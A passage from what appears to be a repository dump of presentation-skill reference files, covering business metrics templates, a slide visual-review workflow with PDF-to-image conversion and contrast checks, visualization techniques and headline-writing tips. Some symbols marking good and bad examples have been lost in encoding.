Goals\n\n| Metric         | Target | Actual | Variance |\n|----------------|--------|--------|----------|\n| Revenue        | $4.0M  | $4.2M  | +5%      |\n| New Customers  | 175    | 162    | -7%      |\n| Expansion      | $300K  | $425K  | +42%     |\n| Churn          | <4%    | 3.2%   | +20%     |\n\n## Customer Insights\n\n**High Performers (Top 20%):**\n- Average contract: $52K\n- Implementation: 14 days\n- Expansion: 180% within 12 months\n\n**At-Risk Indicators:**\n- No login for 7+ days\n- Support ticket volume increasing\n- Feature adoption < 30% at day 30\n\n## Competitive Landscape\n- Competitor A: Launched similar feature (Q3)\n- Competitor B: Raised $50M Series C\n- Our advantage: Superior integration ecosystem\n\n## Investment Areas\n1. **Sales Ops** (Q1 2025)\n   - CRM optimization\n   - Sales enablement content\n   - Target: $5.2M revenue\n\n2. **Product Dev** (Q1-Q2 2025)\n   - API v2 launch\n   - Mobile app\n   - Target: 40% faster implementation\n\n3. **Marketing** (Q1 2025)\n   - Content engine\n   - Partner program\n   - Target: 30% self-serve pipeline\n\n## Risk Factors\n- Hiring: 2 key positions still open\n- Technical debt in billing system\n- Enterprise sales cycle lengthening\n\n## Ask\n- Approve $800K for Q1 hiring\n- Prioritize billing system refactor\n- Decision needed: Partner strategy (Jan 15)\n```\n\n## Template 5: Weekly Metrics Email\n\n```markdown\n# Weekly Metrics - Week of Jan 8\n\n## The Headline\nPipeline velocity up 35% after sales process changes\n\n## This Week's Numbers\n- New signups: 127 ( 8% WoW)\n- Activations: 89 (70% conversion,  5%)\n- Expansion MRR: $18K ( $3K)\n- Churn: 2 customers (-$2.4K)\n\n## Key Achievements\n- Closed largest deal ever ($125K ARR)\n- Beta program: 45 companies, 92% active\n- Partnership with [Company] announced\n\n## Watch List\n- Trial  Paid conversion down 2%\n- Support ticket volume up 15%\n- 3 enterprise deals in legal review\n\n## Actions\n- A/B test new onboarding email\n- Add support automation for common issues\n- Sales: Follow up on stuck deals\n\n## Next Week\n- Launch referral program\n- Host webinar on ROI calculator\n- Interview VP Sales candidates\n```\n",
        "plugins/sys-research/skills/architecting-slides/references/visual_review_workflow.md": "# Visual Review Workflow for Presentations\n\n## Overview\n\nVisual review is a critical quality assurance step for presentations, allowing you to identify and fix layout issues, text overflow, element overlap, and design problems before presenting. This guide covers converting presentations to images, systematic visual inspection, common issues, and iterative improvement strategies.\n\n## WARNING CRITICAL RULE: NEVER READ PDF PRESENTATIONS DIRECTLY\n\n**MANDATORY: Always convert presentation PDFs to images FIRST, then review the images.**\n\n### Why This Rule Exists\n\n- **Buffer Overflow Prevention**: Presentation PDFs (especially multi-slide decks) cause \"JSON message exceeded maximum buffer size\" errors when read directly\n- **Visual Accuracy**: Images show exactly what the audience will see, including rendering issues\n- **Performance**: Image-based review is faster and more reliable than PDF text extraction\n- **Consistency**: Ensures uniform review process for all presentations\n\n### The ONLY Correct Workflow for Presentations\n\n1. Generate PDF from PowerPoint/Beamer source\n2. **Convert PDF to images** using the pdf_to_images.py script\n3. **Review the image files** systematically\n4. Document issues by slide number\n5. Fix issues in source files\n6. Regenerate PDF and repeat\n\n### What NOT To Do\n\n- NEVER use read_file tool on presentation PDFs\n- NEVER attempt to read PDF slides as text\n- NEVER skip the image conversion step\n- NEVER assume PDF is \"small enough\" to read directly\n\n**If you're reviewing a presentation and haven't converted to images yet, STOP and convert first.**\n\n## Why Visual Review Matters\n\n### Common Problems Invisible in Source\n\n**LaTeX Beamer Issues**:\n- Text overflow from text boxes\n- Overlapping elements (equations over images)\n- Poor line breaking\n- Figures extending beyond slide boundaries\n- Font size issues at actual resolution\n\n**PowerPoint Issues**:\n- Text cut off by shapes or slide edges\n- Images overlapping with text\n- Inconsistent spacing between slides\n- Color rendering differences\n- Font substitution problems\n\n**Projection Issues**:\n- Content visible on laptop but cut off when projected\n- Colors looking different on projector\n- Low contrast elements becoming invisible\n- Small details disappearing\n\n### Benefits of Visual Review\n\n- **Catch layout errors early**: Fix before printing or presenting\n- **Verify readability**: Ensure text is large enough and high contrast\n- **Check consistency**: Spot inconsistencies across slides\n- **Test accessibility**: Verify color contrast and clarity\n- **Validate design**: Ensure professional appearance\n\n## Conversion: PDF to Images\n\n### Method 1: Using pdf_to_images.py Script (Recommended)\n\n**No External Dependencies Required**:\nThe script uses PyMuPDF, a self-contained Python library - no poppler or other system software needed.\n\n**Installation**:\n```bash\n# PyMuPDF is included as a project dependency\npip install pymupdf\n```\n\n**Basic Conversion**:\n```bash\n# Convert all slides to JPEG images\npython skills/scientific-slides/scripts/pdf_to_images.py presentation.pdf slide --dpi 150\n\n# Creates: slide-001.jpg, slide-002.jpg, slide-003.jpg, ...\n```\n\n**High-Resolution Conversion**:\n```bash\n# Higher quality for detailed inspection (300 DPI)\npython skills/scientific-slides/scripts/pdf_to_images.py presentation.pdf slide --dpi 300\n\n# PNG format (lossless, larger files)\npython skills/scientific-slides/scripts/pdf_to_images.py presentation.pdf slide --dpi 150 --format png\n```\n\n**Convert Specific Slides**:\n```bash\n# Slides 5-10 only\npython skills/scientific-slides/scripts/pdf_to_images.py presentation.pdf slide --dpi 150 --first 5 --last 10\n\n# Single slide\npython skills/scientific-slides/scripts/pdf_to_images.py presentation.pdf slide --dpi 150 --first 3 --last 3\n```\n\n**Output Options**:\n```bash\n# Different output directory\npython skills/scientific-slides/scripts/pdf_to_images.py presentation.pdf review/slide --dpi 150\n\n# Custom naming\npython skills/scientific-slides/scripts/pdf_to_images.py presentation.pdf output/presentation --dpi 150\n```\n\n### Method 2: Using PowerPoint Thumbnail Script\n\nFor PowerPoint presentations, use the pptx skill's thumbnail tool:\n\n```bash\n# Create thumbnail grid\npython scripts/thumbnail.py presentation.pptx output --cols 4\n\n# Individual slides\npython scripts/thumbnail.py presentation.pptx slides/slide --individual\n```\n\n**Advantages**:\n- Optimized for PowerPoint files\n- Can create overview grids\n- Handles .pptx format directly\n- Customizable layout\n\n### Method 3: Using ImageMagick\n\n**Installation**:\n```bash\n# Ubuntu/Debian\nsudo apt-get install imagemagick\n\n# macOS\nbrew install imagemagick\n```\n\n**Conversion**:\n```bash\n# Convert PDF to images\nconvert -density 150 presentation.pdf slide.jpg\n\n# Higher quality\nconvert -density 300 presentation.pdf slide.jpg\n\n# Specific format\nconvert -density 150 presentation.pdf slide.png\n```\n\n### Method 4: Using Python (Programmatic)\n\n```python\nimport fitz  # PyMuPDF\n\n# Open PDF\ndoc = fitz.open('presentation.pdf')\n\n# Convert each page to image\nzoom = 200 / 72  # 200 DPI (72 is base DPI)\nmatrix = fitz.Matrix(zoom, zoom)\n\nfor i, page in enumerate(doc, start=1):\n    pixmap = page.get_pixmap(matrix=matrix)\n    pixmap.save(f'slide-{i:03d}.jpg', output='jpeg')\n\ndoc.close()\n```\n\n**Install PyMuPDF**:\n```bash\npip install pymupdf\n# No external dependencies needed!\n```\n\n## Systematic Visual Inspection\n\n### Inspection Workflow\n\n**Step 1: Overview Pass**\n- View all slides quickly\n- Note overall consistency\n- Identify obviously problematic slides\n- Create list of slides needing detailed review\n\n**Step 2: Detailed Inspection**\n- Review each flagged slide carefully\n- Check against issue checklist (below)\n- Document specific problems with slide numbers\n- Take notes on required fixes\n\n**Step 3: Cross-Slide Comparison**\n- Check consistency across similar slides\n- Verify uniform spacing and alignment\n- Ensure consistent font sizes\n- Check color scheme consistency\n\n**Step 4: Distance Test**\n- View images at reduced size (simulates projection)\n- Check readability from ~6 feet\n- Verify key elements are visible\n- Test if main message is clear\n\n### Issue Checklist\n\nReview each slide for these common problems:\n\n#### Text Issues\n\n**Overflow and Truncation**:\n- [ ] Text cut off at slide edges\n- [ ] Text extending beyond text boxes\n- [ ] Equations running into margins\n- [ ] Captions cut off at bottom\n- [ ] Bullet points extending beyond boundary\n\n**Readability**:\n- [ ] Font size too small (minimum 18pt visible)\n- [ ] Poor contrast (text vs background)\n- [ ] Inadequate line spacing\n- [ ] Text too close to slide edge\n- [ ] Overlapping lines of text\n\n#### Element Overlap\n\n**Text Overlaps**:\n- [ ] Text overlapping with images\n- [ ] Text overlapping with shapes\n- [ ] Multiple text boxes overlapping\n- [ ] Labels overlapping with data points\n- [ ] Title overlapping with content\n\n**Visual Element Overlaps**:\n- [ ] Images overlapping\n- [ ] Shapes overlapping inappropriately\n- [ ] Figures extending into margins\n- [ ] Legend overlapping with plot\n- [ ] Watermark obscuring content\n\n#### Layout and Spacing\n\n**Alignment Issues**:\n- [ ] Misaligned text boxes\n- [ ] Uneven margins\n- [ ] Inconsistent element positioning\n- [ ] Off-center titles\n- [ ] Unaligned bullet points\n\n**Spacing Problems**:\n- [ ] Cramped content (insufficient white space)\n- [ ] Too much empty space (poor use of slide area)\n- [ ] Inconsistent spacing between elements\n- [ ] Uneven gaps in multi-column layouts\n- [ ] Poor distribution of content\n\n#### Color and Contrast\n\n**Visibility**:\n- [ ] Insufficient contrast (text vs background)\n- [ ] Colors too similar (hard to distinguish)\n- [ ] Text on busy backgrounds\n- [ ] Light text on light background\n- [ ] Dark text on dark background\n\n**Consistency**:\n- [ ] Inconsistent color schemes between slides\n- [ ] Unexpected color changes\n- [ ] Clashing color combinations\n- [ ] Poor color choices for data visualization\n\n#### Figures and Graphics\n\n**Quality**:\n- [ ] Pixelated or blurry images\n- [ ] Low-resolution figures\n- [ ] Distorted aspect ratios\n- [ ] Poor quality screenshots\n- [ ] Jagged edges on graphics\n\n**Layout**:\n- [ ] Figures too small to read\n- [ ] Axis labels too small\n- [ ] Legend text illegible\n- [ ] Complex figures without explanation\n- [ ] Figures not centered or aligned\n\n#### Technical Issues\n\n**Rendering**:\n- [ ] Missing fonts (substituted)\n- [ ] Special characters not displaying\n- [ ] Equations rendering incorrectly\n- [ ] Broken images or missing files\n- [ ] Incorrect colors (RGB vs CMYK)\n\n**Consistency**:\n- [ ] Slide numbers incorrect or missing\n- [ ] Inconsistent footer/header\n- [ ] Navigation elements broken\n- [ ] Hyperlinks not working (if testing interactively)\n\n## Documentation Template\n\n### Issue Log Format\n\nCreate a spreadsheet or document tracking all issues:\n\n```\nSlide # | Issue Category | Description | Severity | Status\n--------|---------------|-------------|----------|--------\n3       | Text Overflow | Bullet point 4 extends beyond box | High | Fixed\n7       | Element Overlap | Figure overlaps with caption | High | Fixed\n12      | Font Size | Axis labels too small | Medium | Fixed\n15      | Alignment | Title not centered | Low | Fixed\n22      | Contrast | Yellow text on white background | High | Fixed\n```\n\n**Severity Levels**:\n- **Critical**: Makes slide unusable or unprofessional\n- **High**: Significantly impacts readability or appearance\n- **Medium**: Noticeable but doesn't prevent comprehension\n- **Low**: Minor cosmetic issues\n\n### Example Issue Documentation\n\n**Good Documentation**:\n```\nSlide 8: Text Overflow Issue\n- Description: Last bullet point \"...implementation details\" \n  extends ~0.5 inches beyond right margin of text box\n- Cause: Bullet text too long for available width\n- Fix: Reduce text to \"...implementation\" or increase box width\n- Verification: Check neighboring slides for similar issue\n```\n\n**Poor Documentation**:\n```\nSlide 8: text problem\n- Fix: make smaller\n```\n\n## Common Issues and Solutions\n\n### Issue 1: Text Overflow\n\n**Problem**: Text extends beyond boundaries\n\n**Identification**:\n- Visible text cut off at edge\n- Text running into margins\n- Partial characters visible\n\n**Solutions**:\n\n**LaTeX Beamer**:\n```latex\n% Reduce text\n\\begin{frame}{Title}\n  \\begin{itemize}\n    \\item Shorten this long bullet point\n    % or\n    \\item Use abbreviations or acronyms\n    % or\n    \\item<alert@1> Split into multiple bullets\n  \\end{itemize}\n\\end{frame}\n\n% Adjust margins\n\\newgeometry{margin=1.5cm}\n\\begin{frame}\n  Content with wider margins\n\\end{frame}\n\\restoregeometry\n\n% Smaller font for specific element\n{\\small\n  Long text that needs to fit\n}\n```\n\n**PowerPoint**:\n- Reduce font size for that element\n- Shorten text content\n- Increase text box size\n- Use text box auto-fit options (cautiously)\n- Split into multiple slides\n\n### Issue 2: Element Overlap\n\n**Problem**: Elements overlapping inappropriately\n\n**Identification**:\n- Text obscured by images\n- Shapes covering text\n- Figures overlapping\n\n**Solutions**:\n\n**LaTeX Beamer**:\n```latex\n% Use columns for better separation\n\\begin{columns}\n  \\begin{column}{0.5\\textwidth}\n    Text content\n  \\end{column}\n  \\begin{column}{0.5\\textwidth}\n    \\includegraphics[width=\\textwidth]{figure.pdf}\n  \\end{column}\n\\end{columns}\n\n% Add spacing\n\\vspace{0.5cm}\n\n% Adjust figure size\n\\includegraphics[width=0.7\\textwidth]{figure.pdf}\n```\n\n**PowerPoint**:\n- Use alignment guides to reposition\n- Reduce element sizes\n- Use two-column layout\n- Send elements backward/forward (layering)\n- Increase spacing between elements\n\n### Issue 3: Poor Contrast\n\n**Problem**: Text difficult to read due to color choices\n\n**Identification**:\n- Squinting required to read text\n- Text fades into background\n- Colors too similar\n\n**Solutions**:\n\n**LaTeX Beamer**:\n```latex\n% Increase contrast\n\\setbeamercolor{frametitle}{fg=black,bg=white}\n\\setbeamercolor{normal text}{fg=black,bg=white}\n\n% Use darker colors\n\\definecolor{darkblue}{RGB}{0,50,100}\n\\setbeamercolor{structure}{fg=darkblue}\n\n% Test in grayscale\n\\usepackage{xcolor}\n\\selectcolormodel{gray}  % Temporarily for testing\n```\n\n**PowerPoint**:\n- Choose high-contrast color combinations\n- Use dark text on light background or vice versa\n- Avoid pastels for text\n- Test with WebAIM contrast checker\n- Add text background box if needed\n\n### Issue 4: Tiny Fonts\n\n**Problem**: Text too small to read from distance\n\n**Identification**:\n- Can't read text from 3 feet away\n- Axis labels disappear when viewing normally\n- Captions illegible\n\n**Solutions**:\n\n**LaTeX Beamer**:\n```latex\n% Increase base font size\n\\documentclass[14pt]{beamer}  % Instead of 11pt default\n\n% Recreate figures with larger fonts\n% In matplotlib:\nplt.rcParams['font.size'] = 18\nplt.rcParams['axes.labelsize'] = 20\n\n% In R/ggplot2:\ntheme_set(theme_minimal(base_size = 16))\n```\n\n**PowerPoint**:\n- Minimum 18pt for body text, 24pt preferred\n- Recreate figures with larger labels\n- Use direct labeling instead of legends\n- Simplify complex figures\n- Split dense content across multiple slides\n\n### Issue 5: Misalignment\n\n**Problem**: Elements not properly aligned\n\n**Identification**:\n- Uneven margins\n- Titles at different positions\n- Irregular spacing\n\n**Solutions**:\n\n**LaTeX Beamer**:\n```latex\n% Use consistent templates\n\\setbeamertemplate{frametitle}[default][center]\n\n% Align columns at top\n\\begin{columns}[T]  % T = top alignment\n  \\begin{column}{0.5\\textwidth}\n    Content\n  \\end{column}\n  \\begin{column}{0.5\\textwidth}\n    Content\n  \\end{column}\n\\end{columns}\n\n% Center figures\n\\begin{center}\n  \\includegraphics[width=0.8\\textwidth]{figure.pdf}\n\\end{center}\n```\n\n**PowerPoint**:\n- Use alignment tools (Align Left/Center/Right)\n- Enable gridlines and guides\n- Use snap to grid\n- Distribute objects evenly\n- Create master slides with consistent layouts\n\n## Iterative Improvement Process\n\n### Workflow Cycle\n\n```\n1. Generate PDF\n    \n2. Convert to images\n    \n3. Systematic visual inspection\n    \n4. Document issues\n    \n5. Prioritize fixes\n    \n6. Apply corrections to source\n    \n7. Regenerate PDF\n    \n8. Re-inspect (go to step 2)\n    \n9. Complete when no critical issues remain\n```\n\n### Prioritization Strategy\n\n**Fix Immediately** (Block presentation):\n- Text overflow making content unreadable\n- Critical element overlaps obscuring data\n- Broken figures or missing content\n- Severely poor contrast\n\n**Fix Before Presenting**:\n- Font sizes too small\n- Moderate alignment issues\n- Inconsistent spacing\n- Moderate contrast problems\n\n**Fix If Time Permits**:\n- Minor misalignments\n- Small spacing inconsistencies\n- Cosmetic improvements\n- Non-critical color adjustments\n\n### Stopping Criteria\n\n**Minimum Standards**:\n- [ ] No text overflow or truncation\n- [ ] No element overlaps obscuring content\n- [ ] All text readable at minimum 18pt equivalent\n- [ ] Adequate contrast (4.5:1 ratio minimum)\n- [ ] Figures and images display correctly\n- [ ] Consistent slide structure\n\n**Ideal Standards**:\n- [ ] Professional appearance throughout\n- [ ] Consistent alignment and spacing\n- [ ] High contrast (7:1 ratio)\n- [ ] Optimal font sizes (24pt+)\n- [ ] Polished visual design\n- [ ] Zero layout issues\n\n## Automated Detection Strategies\n\n### Python Script for Text Overflow Detection\n\n```python\nfrom PIL import Image\nimport numpy as np\n\ndef detect_edge_content(image_path, threshold=10):\n    \"\"\"\n    Detect if content extends too close to slide edges.\n    Returns True if potential overflow detected.\n    \"\"\"\n    img = Image.open(image_path).convert('L')  # Grayscale\n    arr = np.array(img)\n    \n    # Check edges (10 pixel border)\n    left_edge = arr[:, :threshold]\n    right_edge = arr[:, -threshold:]\n    top_edge = arr[:threshold, :]\n    bottom_edge = arr[-threshold:, :]\n    \n    # Look for non-white pixels (content)\n    white_threshold = 240\n    \n    issues = []\n    if np.any(left_edge < white_threshold):\n        issues.append(\"Left edge\")\n    if np.any(right_edge < white_threshold):\n        issues.append(\"Right edge\")\n    if np.any(top_edge < white_threshold):\n        issues.append(\"Top edge\")\n    if np.any(bottom_edge < white_threshold):\n        issues.append(\"Bottom edge\")\n    \n    return issues\n\n# Usage\nfor slide_num in range(1, 26):\n    issues = detect_edge_content(f'slide-{slide_num}.jpg')\n    if issues:\n        print(f\"Slide {slide_num}: Content near {', '.join(issues)}\")\n```\n\n### Contrast Checking\n\n```python\nfrom PIL import Image\nimport numpy as np\n\ndef check_contrast(image_path):\n    \"\"\"\n    Estimate contrast ratio in image.\n    Simple version: compare lightest and darkest regions.\n    \"\"\"\n    img = Image.open(image_path).convert('L')\n    arr = np.array(img)\n    \n    # Get brightness values\n    bright = np.percentile(arr, 95)\n    dark = np.percentile(arr, 5)\n    \n    # Rough contrast ratio\n    contrast = (bright + 0.05) / (dark + 0.05)\n    \n    if contrast < 4.5:\n        return f\"Low contrast: {contrast:.1f}:1 (minimum 4.5:1)\"\n    return f\"OK: {contrast:.1f}:1\"\n\n# Usage\nfor slide_num in range(1, 26):\n    result = check_contrast(f'slide-{slide_num}.jpg')\n    print(f\"Slide {slide_num}: {result}\")\n```\n\n## Manual Review Best Practices\n\n### Review Environment\n\n**Setup**:\n- Large monitor or dual monitors\n- Good lighting (not too bright, not dark)\n- Distraction-free environment\n- Image viewer with zoom capability\n- Notepad or spreadsheet for tracking issues\n\n**Viewing Options**:\n- View at 100% for detail inspection\n- View at 50% to simulate distance\n- View in sequence to check consistency\n- Compare similar slides side-by-side\n\n### Review Tips\n\n**Fresh Eyes**:\n- Take breaks every 15-20 slides\n- Review at different times of day\n- Get colleague to review\n- Come back next day for final check\n\n**Systematic Approach**:\n- Review in order (slide 1  end)\n- Focus on one issue type at a time\n- Use checklist to ensure thoroughness\n- Document as you go, not from memory\n\n**Common Oversights**:\n- Backup slides (review these too!)\n- Title slide (first impression matters)\n- Acknowledgments slide (often forgotten)\n- Last slide (visible during Q&A)\n\n## Tools and Resources\n\n### Recommended Software\n\n**PDF to Image Conversion**:\n- **PyMuPDF** (Python): Fast, no external dependencies (recommended)\n- **pdf_to_images.py script**: Wrapper for easy CLI usage\n- **ImageMagick**: Flexible, many options (optional)\n\n**Image Viewing**:\n- **IrfanView** (Windows): Fast, many formats\n- **Preview** (macOS): Built-in, simple\n- **Eye of GNOME** (Linux): Lightweight\n- **XnView**: Cross-platform, batch operations\n\n**Issue Tracking**:\n- **Spreadsheet** (Excel, Google Sheets): Simple, flexible\n- **Markdown file**: Version control friendly\n- **Issue tracker** (GitHub, Jira): If team collaboration\n- **Checklist app**: For mobile review\n\n### Contrast Checkers\n\n- **WebAIM Contrast Checker**: https://webaim.org/resources/contrastchecker/\n- **Colour Contrast Analyser**: Desktop application\n- **Chrome DevTools**: Built-in contrast checking\n\n### Color Blindness Simulators\n\n- **Coblis**: https://www.color-blindness.com/coblis-color-blindness-simulator/\n- **Color Oracle**: Free desktop application\n- **Photoshop/GIMP**: Built-in color blindness filters\n\n## Summary Checklist\n\nBefore finalizing your presentation:\n\n**Conversion**:\n- [ ] PDF converted to images at adequate resolution (150-300 DPI)\n- [ ] All slides converted (including backup slides)\n- [ ] Images saved in organized directory\n\n**Visual Inspection**:\n- [ ] All slides reviewed systematically\n- [ ] Issue checklist completed for each slide\n- [ ] Problems documented with slide numbers\n- [ ] Severity assigned to each issue\n\n**Issue Resolution**:\n- [ ] Critical issues fixed\n- [ ] High-priority issues addressed\n- [ ] Source files updated (not just PDF)\n- [ ] Regenerated and re-inspected\n\n**Final Verification**:\n- [ ] No text overflow or truncation\n- [ ] No inappropriate element overlaps\n- [ ] Adequate contrast throughout\n- [ ] Consistent layout and spacing\n- [ ] Professional appearance\n- [ ] Ready for projection or distribution\n\n**Testing**:\n- [ ] Tested on projector if possible\n- [ ] Viewed from back of room distance\n- [ ] Checked in various lighting conditions\n- [ ] Backup copy saved\n",
        "plugins/sys-research/skills/architecting-slides/references/visualization.md": "# Visualization Techniques\n\n## Technique 1: Progressive Reveal\n\n```markdown\nStart simple, add layers:\n\nSlide 1: \"Revenue is growing\" [single line chart]\nSlide 2: \"But growth is slowing\" [add growth rate overlay]\nSlide 3: \"Driven by one segment\" [add segment breakdown]\nSlide 4: \"Which is saturating\" [add market share]\nSlide 5: \"We need new segments\" [add opportunity zones]\n```\n\n## Technique 2: Contrast and Compare\n\n```markdown\nBefore/After:\n\n    BEFORE            AFTER       \n                                  \n  Process: 5 days  Process: 1 day \n  Errors: 15%     Errors: 2%     \n  Cost: $50/unit   Cost: $20/unit \n\n\nThis/That (emphasize difference):\n\n         CUSTOMER A vs B             \n            \n                      \n   $45,000       $8,000         \n   LTV           LTV            \n            \n  Onboarded       No onboarding     \n\n```\n\n## Technique 3: Annotation and Highlight\n\n```python\nimport matplotlib.pyplot as plt\nimport pandas as pd\n\nfig, ax = plt.subplots(figsize=(12, 6))\n\n# Plot the main data\nax.plot(dates, revenue, linewidth=2, color='#2E86AB')\n\n# Add annotation for key events\nax.annotate(\n    'Product Launch\\n+32% spike',\n    xy=(launch_date, launch_revenue),\n    xytext=(launch_date, launch_revenue * 1.2),\n    fontsize=10,\n    arrowprops=dict(arrowstyle='->', color='#E63946'),\n    color='#E63946'\n)\n\n# Highlight a region\nax.axvspan(growth_start, growth_end, alpha=0.2, color='green',\n           label='Growth Period')\n\n# Add threshold line\nax.axhline(y=target, color='gray', linestyle='--',\n           label=f'Target: ${target:,.0f}')\n\nax.set_title('Revenue Growth Story', fontsize=14, fontweight='bold')\nax.legend()\n```\n\n## Visualization Principles\n\n### Choose the Right Chart Type\n\n**For Comparisons:**\n- Bar charts for categorical data\n- Stacked bars for composition\n- Grouped bars for multi-category comparison\n\n**For Trends:**\n- Line charts for time series\n- Area charts for cumulative trends\n- Slope charts for before/after\n\n**For Relationships:**\n- Scatter plots for correlations\n- Bubble charts for 3D data\n- Heatmaps for matrix data\n\n### Color Strategy\n\n**High Contrast:**\n- Primary: #2E86AB (blue)\n- Secondary: #A23B72 (purple)\n- Accent: #F18F01 (orange)\n- Alert: #E63946 (red)\n- Success: #06A77D (green)\n\n**Usage:**\n- Use accent colors sparingly for emphasis\n- Gray for non-important elements\n- Red for warnings, green for success\n\n### Typography\n\n**Font Hierarchy:**\n- Headline: 18-24pt, bold\n- Subhead: 14-16pt, semi-bold\n- Body: 10-12pt, regular\n- Caption: 8-10pt, italic\n\n**Spacing:**\n- Leave whitespace around data\n- Use gridlines sparingly\n- Avoid overcrowding labels\n",
        "plugins/sys-research/skills/architecting-slides/references/writing.md": "# Writing Techniques\n\n## Headlines That Work\n\n```markdown\nBAD: \"Q4 Sales Analysis\"\nGOOD: \"Q4 Sales Beat Target by 23% - Here's Why\"\n\nBAD: \"Customer Churn Report\"\nGOOD: \"We're Losing $2.4M to Preventable Churn\"\n\nBAD: \"Marketing Performance\"\nGOOD: \"Content Marketing Delivers 4x ROI vs. Paid\"\n\nFormula:\n[Specific Number] + [Business Impact] + [Actionable Context]\n```\n\n### Headline Patterns\n\n**The Number-First Pattern:**\n- \"27% of trials convert within 24 hours\"\n- \"$1.2M in revenue from one feature launch\"\n- \"Customer support time down 60%\"\n\n**The Problem-Solution Pattern:**\n- \"Why customers churn in week 2\"\n- \"The hidden cost of manual processes\"\n- \"What makes enterprise deals close faster\"\n\n**The Contrast Pattern:**\n- \"Self-serve vs. full-service: Which wins?\"\n- \"B2B vs. B2C: Different playbooks needed\"\n- \"What top 1% do differently\"\n\n**The Action Pattern:**\n- \"5 steps to reduce churn by 40%\"\n- \"How to double trial conversion\"\n- \"What we learned from 100 customer interviews\"\n\n## Transition Phrases\n\n```markdown\nBuilding the narrative:\n \"This leads us to ask...\"\n \"When we dig deeper...\"\n \"The pattern becomes clear when...\"\n \"Contrast this with...\"\n \"Digging into the data...\"\n \"Looking at the numbers...\"\n \"The trend becomes apparent when...\"\n\nIntroducing insights:\n \"The data reveals...\"\n \"What surprised us was...\"\n \"The inflection point came when...\"\n \"The key finding is...\"\n \"Analysis shows...\"\n \"Unsurprisingly...\"\n \"Counterintuitively...\"\n\nMoving to action:\n \"This insight suggests...\"\n \"Based on this analysis...\"\n \"The implication is clear...\"\n \"Our recommendation is...\"\n \"This points to three actions...\"\n \"The next logical step is...\"\n \"To capitalize on this trend...\"\n\nConnecting ideas:\n \"Building on this...\"\n \"Taking this one step further...\"\n \"This connects to our previous finding...\"\n \"This brings us to a bigger picture...\"\n \"Zooming out...\"\n \"At a strategic level...\"\n \"From a customer perspective...\"\n```\n\n## Handling Uncertainty\n\n```markdown\nAcknowledge limitations:\n \"With 95% confidence, we can say...\"\n \"The sample size of 500 shows...\"\n \"While correlation is strong, causation requires...\"\n \"This trend holds for [segment], though [caveat]...\"\n \"Preliminary data suggests...\"\n \"Early indicators point to...\"\n \"The pattern is consistent with...\"\n\nPresent ranges:\n \"Impact estimate: $400K-$600K\"\n \"Confidence interval: 15-20% improvement\"\n \"Best case: X, Conservative: Y\"\n \"Likely range: 2-4x improvement\"\n \"Probability: 70% chance of success\"\n\nProvide context:\n \"Based on 6 months of data\"\n \"Across 2,000 customer interactions\"\n \"In line with industry benchmarks\"\n \"Consistent with last quarter's findings\"\n \"Matches external research\"\n```\n\n## Voice and Tone\n\n### Executive Communication\n\n**Tone: Confident, concise, action-oriented**\n\n```markdown\n \"Revenue grew 23% QoQ to $4.2M\"\n \"We saw some growth in our revenue\"\n\n \"Q3 pipeline velocity increased 35%\"\n \"Things seem to be moving faster\"\n\n \"Three actions needed to maintain growth\"\n \"Perhaps we should consider some options\"\n\n \"Target: $5M ARR by year-end\"\n \"Maybe we could try to hit $5M\"\n```\n\n### Technical Communication\n\n**Tone: Precise, evidence-based, clear**\n\n```markdown\n \"Conversion rate improved from 8% to 15%\"\n \"Conversion is better now\"\n\n \"Statistical significance: p < 0.05\"\n \"The numbers look good\"\n\n \"Correlation coefficient: 0.82\"\n \"These seem related\"\n\n \"95% confidence interval: [12%, 18%]\"\n \"Probably around 15%\"\n```\n\n### Customer Communication\n\n**Tone: Helpful, empathetic, solution-focused**\n\n```markdown\n \"Here's what the data tells us about your situation\"\n \"Let me show you this analysis\"\n\n \"Based on your usage patterns, we recommend...\"\n \"We think you should try...\"\n\n \"You're not alone - 60% of customers ask this\"\n \"That's a common question\"\n\n \"To get the most value from [product], try...\"\n \"You should use [feature]\"\n```\n\n## Sentence Structure\n\n### Active Voice\n\n```markdown\n \"The team launched the feature\"\n \"The feature was launched by the team\"\n\n \"Customers adopted the new workflow\"\n \"The new workflow was adopted by customers\"\n\n \"Marketing drove 200 qualified leads\"\n \"200 qualified leads were driven by marketing\"\n```\n\n### Parallel Structure\n\n```markdown\n \"We analyzed the data, identified the pattern, and acted\"\n \"We analyzed the data, identified the pattern, and taking action\"\n\n \"Faster, cheaper, better\"\n \"Fast, cheaper, and good quality\"\n\n \"Plan, execute, measure, optimize\"\n \"Planning, execution, measurement, and optimization\"\n```\n\n### Varied Sentence Length\n\n```markdown\nShort sentences for impact:\n\"We missed target by 15%. That's $600K in revenue. We need to act now.\"\n\nLonger sentences for context:\n\"After analyzing 6 months of customer data, we identified three key patterns: usage drops significantly after the first week, support tickets cluster around specific features, and expansion revenue correlates directly with onboarding quality.\"\n\nMixed for rhythm:\n\"Revenue is up. Q4 saw $4.2M in total bookings, representing 23% growth quarter-over-quarter. The growth wasn't evenly distributed though - enterprise accounts grew 45% while SMB remained flat at 12%.\"\n```\n\n## Numbers and Metrics\n\n### When to Use Numbers\n\n```markdown\nUse specific numbers:\n \"23% increase\" not \"significant increase\"\n \"$2.4M in churn\" not \"substantial revenue loss\"\n \"15 points higher\" not \"much better\"\n\nUse ranges for predictions:\n \"15-20% improvement expected\"\n \"$400K-$600K potential impact\"\n \"2-3x faster implementation\"\n\nUse comparisons:\n \"2x better than industry average\"\n \"23% above target\"\n \"15 points higher than Q3\"\n```\n\n### Metric Naming\n\n```markdown\n \"Monthly Recurring Revenue (MRR)\"\n \"MRR number\"\n\n \"Customer Acquisition Cost (CAC)\"\n \"CAC metric\"\n\n \"Net Revenue Retention (NRR)\"\n \"Revenue retention rate\"\n\n \"Annual Contract Value (ACV)\"\n \"Yearly contract value\"\n```\n\n## Call to Action Patterns\n\n```markdown\nRequest-specific actions:\n \"Approve $50K budget for onboarding automation\"\n \"Decide on APAC expansion by January 15\"\n \"Hire 2 engineers for billing team\"\n\nRequest information:\n \"Please review the analysis by Friday\"\n \"Need your input on the recommendations\"\n \"Confirm your availability for QBR\"\n\nCreate urgency:\n \"This opportunity closes March 31\"\n \"Market conditions are favorable now\"\n \"Waiting will reduce impact by 40%\"\n```\n\n## Opening Lines\n\n```markdown\nData-driven opener:\n\"Revenue crossed $4M in Q4, but growth is slowing.\"\n\"Customer churn hit a 2-year high at 8.5%.\"\n\"Pipeline velocity increased 35% after one process change.\"\n\nQuestion opener:\n\"What if I told you we could cut churn in half?\"\n\"Why are enterprise deals closing 60% faster?\"\n\"How much revenue are we losing to 